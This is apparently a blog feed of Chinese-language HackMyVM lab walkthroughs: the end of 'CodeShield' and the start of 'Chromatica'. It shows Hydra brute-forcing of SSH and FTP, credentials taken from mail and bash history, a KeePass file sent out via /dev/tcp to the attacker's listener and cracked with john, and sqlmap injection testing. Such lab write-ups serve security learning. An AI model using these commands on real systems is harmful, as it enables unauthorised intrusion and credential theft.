        names = read_names_from_file(file_path)
        # 生成用户名列表
        usernames = generate_usernames(names)
        # 打印生成的用户名
        for username in usernames:
            print(username)
    except FileNotFoundError:
        print(f'Error: The file {file_path} was not found.')
        sys.exit(1)

if __name__ == '__main__':
    main()

┌──(kali㉿kali)-[~/test/tmp]
└─$ cat user   
Angelina Johnson
Jennifer Cruise
John Doe
Bob Watson
Mohammed Mansour
Xian Tan
Thomas Mitchell
Patrick Early
Kevin Valdez
j.carlson

┌──(kali㉿kali)-[~/test/tmp]
└─$ python3 user.py user &gt;&gt; user
                                                                                                                                    
┌──(kali㉿kali)-[~/test/tmp]
└─$ cat user
Angelina Johnson
Jennifer Cruise
John Doe
Bob Watson
Mohammed Mansour
Xian Tan
Thomas Mitchell
Patrick Early
Kevin Valdez
j.carlson
Skipping invalid name: j.carlson
ajohnson
angelinajohnson
johnsona
angelina
johnson
a.johnson
jcruise
jennifercruise
cruisej
jennifer
cruise
j.cruise
jdoe
johndoe
doej
john
doe
j.doe
bwatson
bobwatson
watsonb
bob
watson
b.watson
mmansour
mohammedmansour
mansourm
mohammed
mansour
m.mansour
xtan
xiantan
tanx
xian
tan
x.tan
tmitchell
thomasmitchell
mitchellt
thomas
mitchell
t.mitchell
pearly
patrickearly
earlyp
patrick
early
p.early
kvaldez
kevinvaldez
valdezk
kevin
valdez
k.valdez

┌──(kali㉿kali)-[~/test/tmp]
└─$ cat pass                        
Xxxxxxxxx001
Password123!
Greatplace2work!
Diciembre@2017
Hairdresser1!
1qa2ws3ed4rf
XXXX12345678
Hairdresser1
Xxxxxxxxx002
Xxxxxxxxxx01
```

先尝试爆破**ssh服务**

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ hydra -L user -P pass ssh://192.168.205.138 -I -u -f -e nsr -t 64 -s 22222 
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-20 14:55:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 845 login tries (l:65/p:13), ~14 tries per task
[DATA] attacking ssh://192.168.205.138:22222/
[STATUS] 554.00 tries/min, 554 tries in 00:01h, 333 to do in 00:01h, 22 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-20 14:56:24
```

无果，再测试爆破**ftp服务**

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ hydra -L user -P pass ftp://192.168.205.138 -I -u -f -e nsr -t 64     
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-20 14:56:47
[DATA] max 64 tasks per 1 server, overall 64 tasks, 845 login tries (l:65/p:13), ~14 tries per task
[DATA] attacking ftp://192.168.205.138:21/
[21][ftp] host: 192.168.205.138   login: valdezk   password: Greatplace2work!
[STATUS] attack finished for 192.168.205.138 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-20 14:57:11
```

爆破出一组用户和密码，我们进去看看有啥

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ ftp 192.168.205.138
Connected to 192.168.205.138.
220 (vsFTPd 3.0.5)
Name (192.168.205.138:kali): valdezk
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||18011|)
150 Here comes the directory listing.
drwxr-x---   18 1007     1007         4096 Aug 29  2023 .
drwxr-xr-x   14 0        0            4096 Aug 26  2023 ..
-rw-------    1 1007     1007           56 Aug 29  2023 .Xauthority
-rw-rw-r--    1 1007     1007            0 Aug 28  2023 .bash_history
-rw-r--r--    1 1007     1007          220 Aug 26  2023 .bash_logout
-rw-r--r--    1 1007     1007         3771 Aug 26  2023 .bashrc
drwx------   12 1007     1007         4096 Aug 29  2023 .cache
drwx------   11 1007     1007         4096 Aug 28  2023 .config
drwx------    3 1007     1007         4096 Aug 28  2023 .local
drwx------    3 1007     1007         4096 Aug 28  2023 .mozilla
drwxrwxrwt    2 1007     1007         4096 Aug 29  2023 .pcsc10
-rw-r--r--    1 1007     1007          807 Aug 26  2023 .profile
drwx------    6 1007     1007         4096 Aug 28  2023 .thunderbird
-rw-r-----    1 1007     1007            5 Aug 29  2023 .vboxclient-clipboard-tty1-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-clipboard-tty2-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-clipboard-tty4-control.pid
-rw-r-----    1 1007     1007            5 Aug 29  2023 .vboxclient-draganddrop-tty1-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-draganddrop-tty2-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-draganddrop-tty4-control.pid
-rw-r-----    1 1007     1007            5 Aug 29  2023 .vboxclient-hostversion-tty1-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-hostversion-tty2-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-hostversion-tty4-control.pid
-rw-r-----    1 1007     1007            5 Aug 29  2023 .vboxclient-seamless-tty1-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-seamless-tty2-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-seamless-tty4-control.pid
-rw-r-----    1 1007     1007            5 Aug 29  2023 .vboxclient-vmsvga-session-tty1-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-vmsvga-session-tty2-control.pid
-rw-r-----    1 1007     1007            6 Aug 28  2023 .vboxclient-vmsvga-session-tty4-control.pid
-rw-r--r--    1 1007     1007        18728 Aug 29  2023 .xorgxrdp.10.log
-rw-------    1 1007     1007         3985 Aug 29  2023 .xsession-errors
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Desktop
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Documents
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Downloads
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Music
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Pictures
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Public
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Templates
drwxr-xr-x    2 1007     1007         4096 Aug 28  2023 Videos
drwx------    3 1007     1007         4096 Aug 28  2023 snap
drwxrwxr-t    2 1007     1007         4096 Aug 29  2023 thinclient_drives
```

进来发现我们位于家目录。又到一年一度的找宝藏环节

```bash
ftp&gt; pwd
Remote directory: /home/valdezk/.thunderbird/fx2h7mhy.default-release/ImapMail/mail.codeshield.hmv
```

在该目录下挖掘到了宝藏😁

![Image](https://github.com/user-attachments/assets/c909abf0-51cf-42b9-9e4b-d7534b6697cc)

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ cat Trash
From - Mon Aug 28 18:38:57 2023
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Return-Path: &lt;t.mitchell@codeshield.hmv&gt;
Delivered-To: k.valdez@codeshield.hmv
Received: from mail.codeshield.hmv (mail.codeshield.hmv [127.0.0.1])
        by mail.codeshield.hmv (Postfix) with ESMTP id 4RXwV61k4Jz62kW
        for &lt;k.valdez@codeshield.hmv&gt;; Sat, 26 Aug 2023 12:04:30 +0000 (UTC)
Authentication-Results: mail.codeshield.hmv (amavisd-new); dkim=pass
        reason='pass (just generated, assumed good)' header.d=codeshield.hmv
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=codeshield.hmv;
         h=content-transfer-encoding:content-type:message-id:user-agent
        :subject:to:from:date:mime-version; s=dkim; t=1693051468; x=
        1695643469; bh=9j2IFk0ZpW4pfmvikNYY7hFOEsr+Ze1bR/Ba4zdoUeU=; b=V
        /krnK4TR1tqxJUcKOs1elfa2D4X6hovoYkOpGBtxQgk2+xA4ADTHUnwNcrG4qRh2
        PG7dbgm+zxZjqfa3x2cdc11BQE9zs4n4D3Hi+aBVUkYFQsQXoWdIpQ7jHntkTSrI
        Mq0tEEuTXmKD/s7YDseYOq1y5kcUaANPYMdVmaf+C/9q2HqEFY5Kzmd+7xlInUIs
        nizkQe+0XeZ6l9xmdDPTQVFQS0O98zTYQgMZ/Hd3oQniIF1aB5TocWfNvOcWbDeI
        S5Cm7IFXX2zs4i8h9j2CTohmYjtAoR+InN2jQYuks3VZaqGaDEfXy5ZfdruFbbrh
        Liceo3ueN5jYMdBS8Fl3A==
X-Virus-Scanned: Debian amavisd-new at mail.codeshield.hmv
Received: from mail.codeshield.hmv ([127.0.0.1])
        by mail.codeshield.hmv (mail.codeshield.hmv [127.0.0.1]) (amavisd-new, port 10026)
        with ESMTP id kyzCgpKZGZvf for &lt;k.valdez@codeshield.hmv&gt;;
        Sat, 26 Aug 2023 12:04:28 +0000 (UTC)
Received: from localhost (mail.codeshield.hmv [127.0.0.1])
        by mail.codeshield.hmv (Postfix) with ESMTPSA id 4RXwV43FB8z62kJ
        for &lt;k.valdez@codeshield.hmv&gt;; Sat, 26 Aug 2023 12:04:27 +0000 (UTC)
MIME-Version: 1.0
Date: Sat, 26 Aug 2023 12:04:26 +0000
From: t.mitchell@codeshield.hmv
To: k.valdez@codeshield.hmv
Subject: Need some help for data analytics
User-Agent: Roundcube Webmail
Message-ID: &lt;7d81f2aca5fd7fb5af8609e03cbe1b3a@codeshield.hmv&gt;
X-Sender: t.mitchell@codeshield.hmv
Content-Type: text/plain; charset=US-ASCII;
 format=flowed
Content-Transfer-Encoding: 7bit

Hi Kevin,

Great that you want to help me with the tooling for data analysis. 
Patrick has set some things up, but I can't get it to work properly. As 
just discussed during coffee, I will send you my login details to so 
that you can fix it under my account and that I can continue working.

Password: D@taWh1sperer!

Thanks buddy!

Thomas
                                                

嗨，凯文，

很高兴你想帮助我开发数据分析工具。
帕特里克已经设置了一些东西，但我无法让它正常工作。正如
我们喝咖啡时讨论的那样，我会将我的登录详细信息发送给你，
这样你就可以在
我的账户下修复它，我就可以继续工作了。

密码：D@taWh1sperer！

谢谢伙计！

托马斯
```

这个用户应该不是ftp了吧，收收神通吧，请赐予我一个ssh

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ hydra -L user -p D@taWh1sperer! ssh://192.168.205.138 -I -u -f -e nsr -t 64 -s 22222
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-20 15:15:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 260 login tries (l:65/p:4), ~5 tries per task
[DATA] attacking ssh://192.168.205.138:22222/
[22222][ssh] host: 192.168.205.138   login: mitchellt   password: D@taWh1sperer!
[STATUS] attack finished for 192.168.205.138 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-20 15:15:18

┌──(kali㉿kali)-[~/test/tmp]
└─$ ssh mitchellt@192.168.205.138 -p 22222
The authenticity of host '[192.168.205.138]:22222 ([192.168.205.138]:22222)' can't be established.
ED25519 key fingerprint is SHA256:Y+iV2eHvzSBp6ZbF+2VqTJdZ5+XyH5tVaxNCzS7tp3I.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.205.138]:22222' (ED25519) to the list of known hosts.
             @@@                          
      @@@@@@@@@  @@@@@@                   
 @@@@@@@@@@@@@@          (@@              
 @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗                                 
 @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗           
  @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║           
  @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║           
    @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝           
     @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝            
        @@@@@@@   @@@                     
           @@@@@@@                                                         

  _______________________________________________________________________________________________________
 |  _WARNING: This system is restricted to authorized users!___________________________________________  |
 | |                                                                                                   | |
 | | IT IS AN OFFENSE TO CONTINUE WITHOUT PROPER AUTHORIZATION.                                        | |
 | |                                                                                                   | |
 | | This system is restricted to authorized users.                                                    | | 
 | | Individuals who attempt unauthorized access will be prosecuted.                                   | | 
 | | If you're unauthorized, terminate access now!                                                     | | 
 | |                                                                                                   | |
 | |                                                                                                   | |
 | |___________________________________________________________________________________________________| |
 |_______________________________________________________________________________________________________|
mitchellt@192.168.205.138's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-79-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan 20 07:15:11 AM UTC 2025

  System load:  0.640625           Processes:               240
  Usage of /:   29.1% of 47.93GB   Users logged in:         0
  Memory usage: 59%                IPv4 address for enp0s3: 192.168.205.138
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

10 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
New release '24.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


mitchellt@codeshield:~$ id
uid=1006(mitchellt) gid=1006(mitchellt) groups=1006(mitchellt)

```

# 3.提权

```bash
mitchellt@codeshield:~$ ls -la
total 112
drwxr-x--- 17 mitchellt mitchellt 4096 Aug 30  2023 .
drwxr-xr-x 14 root      root      4096 Aug 26  2023 ..
-rw-------  1 mitchellt mitchellt  209 Aug 30  2023 .bash_history
-rw-r--r--  1 mitchellt mitchellt  220 Aug 26  2023 .bash_logout
-rw-r--r--  1 mitchellt mitchellt 3771 Aug 26  2023 .bashrc
drwx------ 11 mitchellt mitchellt 4096 Jan 20 07:14 .cache
drwx------ 12 mitchellt mitchellt 4096 Aug 29  2023 .config
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Desktop
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Documents
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Downloads
-rw-------  1 mitchellt mitchellt   20 Aug 29  2023 .lesshst
drwx------  3 mitchellt mitchellt 4096 Aug 28  2023 .local
drwxrwxr-x  6 mitchellt mitchellt 4096 Aug 30  2023 mining
drwx------  3 mitchellt mitchellt 4096 Aug 28  2023 .mozilla
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Music
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Pictures
-rw-r--r--  1 mitchellt mitchellt  807 Aug 26  2023 .profile
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Public
drwx------  3 mitchellt mitchellt 4096 Aug 29  2023 snap
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Templates
drwx------  6 mitchellt mitchellt 4096 Aug 28  2023 .thunderbird
-rwxrwx---  1 mitchellt mitchellt 2401 Aug 28  2023 user.txt
-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-clipboard-tty2-control.pid
-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-draganddrop-tty2-control.pid
-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-hostversion-tty2-control.pid
-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-seamless-tty2-control.pid
-rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-vmsvga-session-tty2-control.pid
drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Videos
mitchellt@codeshield:~$ cat .bash_history
echo 'EARL!YP7DeVel@OP'| su - earlyp -c 'cp -r /home/earlyp/Development/mining .'
echo 'EARL!YP7DeVel@OP'| su - earlyp -c 'cp -r /home/earlyp/Development/mining /tmp'
cp -r /tmp/mining .
ls
cd mining/
ls
exit
mitchellt@codeshield:~$ su - earlyp
Password: 
earlyp@codeshield:~$ sudo -l
[sudo] password for earlyp: 
Sorry, user earlyp may not run sudo on mail.
earlyp@codeshield:~$ ls -la
total 116
drwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 .
drwxr-xr-x 14 root   root   4096 Aug 26  2023 ..
-rw-------  1 earlyp earlyp   36 Aug 29  2023 .bash_history
-rw-r--r--  1 earlyp earlyp  220 Jan  6  2022 .bash_logout
-rw-r--r--  1 earlyp earlyp 3771 Jan  6  2022 .bashrc
drwx------ 12 earlyp earlyp 4096 Aug 23  2023 .cache
drwx------ 16 earlyp earlyp 4096 Aug 28  2023 .config
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Desktop
drwxrwxr-x  3 earlyp earlyp 4096 Aug 28  2023 Development
drwxr-xr-x  2 earlyp earlyp 4096 Aug 28  2023 Documents
drwxr-xr-x  5 earlyp earlyp 4096 Aug 23  2023 Downloads
drwx------  2 earlyp earlyp 4096 Aug 28  2023 .gnupg
drwx------  3 earlyp earlyp 4096 Aug 22  2023 .local
drwxrwxr-x  6 earlyp earlyp 4096 Aug 29  2023 mining
drwxrwxr-x  2 earlyp earlyp 4096 Aug 23  2023 .mono
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Music
drwxr-xr-x  3 earlyp earlyp 4096 Aug 23  2023 Pictures
-rw-r--r--  1 earlyp earlyp  807 Jan  6  2022 .profile
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Public
-rw-rw-r--  1 earlyp earlyp  233 Aug 23  2023 .recently-used
drwx------  3 earlyp earlyp 4096 Aug 22  2023 snap
drwx------  2 earlyp earlyp 4096 Aug 22  2023 .ssh
-rw-r--r--  1 earlyp earlyp    0 Aug 22  2023 .sudo_as_admin_successful
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Templates
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-clipboard-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-draganddrop-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-hostversion-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-seamless-tty2-control.pid
-rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-vmsvga-session-tty2-control.pid
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Videos
earlyp@codeshield:~$ cat .bash_history
cd ~
ls
cd Development/
ls
pwd
exit
earlyp@codeshield:~$ cd Development
earlyp@codeshield:~/Development$ ls -la
total 12
drwxrwxr-x  3 earlyp earlyp 4096 Aug 28  2023 .
drwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 ..
drwxrwxr-x  6 earlyp earlyp 4096 Aug 28  2023 mining
earlyp@codeshield:~/Development$ cd mining/
earlyp@codeshield:~/Development/mining$ ls -al
total 92
drwxrwxr-x 6 earlyp earlyp 4096 Aug 28  2023 .
drwxrwxr-x 3 earlyp earlyp 4096 Aug 28  2023 ..
-rw-rw-r-- 1 earlyp earlyp  298 Aug 28  2023 circle.yml
-rw-rw-r-- 1 earlyp earlyp  358 Aug 28  2023 CONTRIBUTING.rst
-rw-rw-r-- 1 earlyp earlyp   46 Aug 28  2023 .coveralls.yml
-rw-rw-r-- 1 earlyp earlyp  634 Aug 28  2023 docker-compose.yml
-rw-rw-r-- 1 earlyp earlyp  938 Aug 28  2023 Dockerfile
drwxrwxr-x 4 earlyp earlyp 4096 Aug 28  2023 docs
drwxrwxr-x 8 earlyp earlyp 4096 Aug 28  2023 .git
-rw-rw-r-- 1 earlyp earlyp  439 Aug 28  2023 .gitignore
-rw-rw-r-- 1 earlyp earlyp  100 Aug 28  2023 .gitmodules
-rw-rw-r-- 1 earlyp earlyp 1081 Aug 28  2023 LICENSE
-rw-rw-r-- 1 earlyp earlyp  794 Aug 28  2023 Makefile
-rw-rw-r-- 1 earlyp earlyp 3181 Aug 28  2023 manage.py
-rw-rw-r-- 1 earlyp earlyp  161 Aug 28  2023 MANIFEST.in
drwxrwxr-x 9 earlyp earlyp 4096 Aug 28  2023 mining
-rw-rw-r-- 1 earlyp earlyp 3501 Aug 28  2023 README.rst
-rw-rw-r-- 1 earlyp earlyp   34 Aug 28  2023 requirements_dev.txt
-rw-rw-r-- 1 earlyp earlyp  261 Aug 28  2023 requirements.txt
drwxrwxr-x 2 earlyp earlyp 4096 Aug 28  2023 scripts
-rw-rw-r-- 1 earlyp earlyp  230 Aug 28  2023 setup.cfg
-rw-rw-r-- 1 earlyp earlyp 2366 Aug 28  2023 setup.py
-rw-rw-r-- 1 earlyp earlyp  312 Aug 28  2023 .travis.yml

earlyp@codeshield:~/Development/mining$ cd ~
earlyp@codeshield:~$ cd Desktop/
earlyp@codeshield:~/Desktop$ ls -al
total 8
drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 .
drwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 ..
earlyp@codeshield:~/Desktop$ cd ~/Documents/
earlyp@codeshield:~/Documents$ ls -al
total 12
drwxr-xr-x  2 earlyp earlyp 4096 Aug 28  2023 .
drwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 ..
-rw-------  1 earlyp earlyp 1918 Aug 28  2023 Passwords.kdbx
```

拷过去破解一下

```bash
earlyp@codeshield:~/Documents$ cat Passwords.kdbx &gt; /dev/tcp/192.168.205.141/7777

#kali
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 7777 &gt; Passwords.kdbx               
listening on [any] 7777 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.138] 53802
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ keepass2john Passwords.kdbx &gt; hash
                                                   
┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 3225806 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:04:14 0.01% (ETA: 2025-02-13 23:25) 0g/s 8.313p/s 8.313c/s 8.313C/s laurita..myfamily
0g 0:00:05:31 0.02% (ETA: 2025-02-14 05:03) 0g/s 8.264p/s 8.264c/s 8.264C/s onlyme..victoria1
0g 0:00:08:56 0.03% (ETA: 2025-02-14 05:14) 0g/s 8.228p/s 8.228c/s 8.228C/s priscila..a1b2c3d4
Session aborted
```

爆破了八分钟还没出来，实在等不下去了，我直接去其他大佬那里偷了个密码`mandalorian`，撕.....这个密码在868083行，最小的都在20451行

![Image](https://github.com/user-attachments/assets/53d42048-f033-408e-b311-b7ae95f72946)

快速的切回去换root（不然你要重新双击，它复制有时间限制）

```bash
earlyp@codeshield:~/Documents$ su -
Password: 
root@codeshield:~# id
uid=0(root) gid=0(root) groups=0(root)

```

# 4.后话

去看**ll104567**大佬的wp发现，那个用户不用这么麻烦获取，你直接看他虚拟机图形化界面的登录就好了，那里全有，而且**valdezk ftp**那里，作者是让我们登录那个**web mail**查看的，不是直接看源码......sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_CodeShield.html</guid><pubDate>Fri, 27 Jun 2025 09:32:51 +0000</pubDate></item><item><title>hmv_Chromatica</title><link>https://7r1UMPHK.github.io/post/hmv_Chromatica.html</link><description># hmv_Chromatica

**靶机**：https://hackmyvm.eu/machines/machine.php?vm\=Chromatica
**难度**：绿色
**目标 IP**：192.168.205.215
**本机** IP：192.168.205.141

---

### **1. 端口枚举及服务探测**

首先，使用 `nmap` 扫描目标 IP 的开放端口：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.215
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-30 14:18 CST
Nmap scan report for 192.168.205.215
Host is up (0.0017s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
5353/tcp open  domain  dnsmasq 2.86
MAC Address: 08:00:27:95:39:FD (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.66 seconds
```

扫描结果显示目标机器开放了 22 (SSH) 、 80 (HTTP) 、5353(DNS)端口。

### **2. Web 服务探测与SQL注入**

对 80 端口感兴趣，访问 Web 页面，静态页没有利用价值，扫描一下结构

```bash
┌──(kali㉿kali)-[~/test]
└─$ whatweb http://192.168.205.215/
http://192.168.205.215/ [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.205.215], Script, Title[Chromatica|Coming Soon.....]  
```

Chromatica不知道什么东西，搜一下漏洞

```bash
┌──(kali㉿kali)-[~/test]
└─$ searchsploit Chromatica      
Exploits: No Results
Shellcodes: No Results

```

没有，那就爆破一下目录

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.215/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,md -b 404                       
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.215/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 4047]
/.html                (Status: 403) [Size: 280]
/assets               (Status: 301) [Size: 319] [--&gt; http://192.168.205.215/assets/]
/css                  (Status: 301) [Size: 316] [--&gt; http://192.168.205.215/css/]
/js                   (Status: 301) [Size: 315] [--&gt; http://192.168.205.215/js/]
/javascript           (Status: 301) [Size: 323] [--&gt; http://192.168.205.215/javascript/]
/robots.txt           (Status: 200) [Size: 36]
Progress: 25342 / 6369165 (0.40%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 29872 / 6369165 (0.47%)
===============================================================
Finished
===============================================================

```

`/robots.txt`看看有什么

![image](https://github.com/user-attachments/assets/d2dc4a4f-abca-4887-91d1-22205caca415)

![image](https://github.com/user-attachments/assets/273a707d-7367-49f2-9b0a-04e9862dd39d)

直接访问被拦截，加上用户代理`dev`我这使用的是`hackbar`

![image](https://github.com/user-attachments/assets/f59b082c-f36c-45b3-85c9-d1b41d36438d)

访问成功，有输入框试试sql注入

```bash
┌──(kali㉿kali)-[~/test]
└─$ sqlmap -u 'http://192.168.205.215/dev-portal/' --forms --batch --user-agent dev 
        ___
       __H__                                                                                                                         
 ___ ___[)]_____ ___ ___  {1.8.12#stable}                                                                                              
|_ -| . [,]     | .'| . |                                                                                                            
|___|_  [,]_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:28:16 /2024-12-30/

[14:28:16] [INFO] testing connection to the target URL
[14:28:16] [INFO] searching for forms
[1/1] Form:
GET http://192.168.205.215/dev-portal/search.php?city=
do you want to test this form? [Y/n/q] 
&gt; Y
Edit GET data [default: city=]: city=
do you want to fill blank fields with random values? [Y/n] Y
[14:28:16] [INFO] resuming back-end DBMS 'mysql' 
[14:28:16] [INFO] using '/home/kali/.local/share/sqlmap/output/results-12302024_0228pm.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: city (GET)
    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
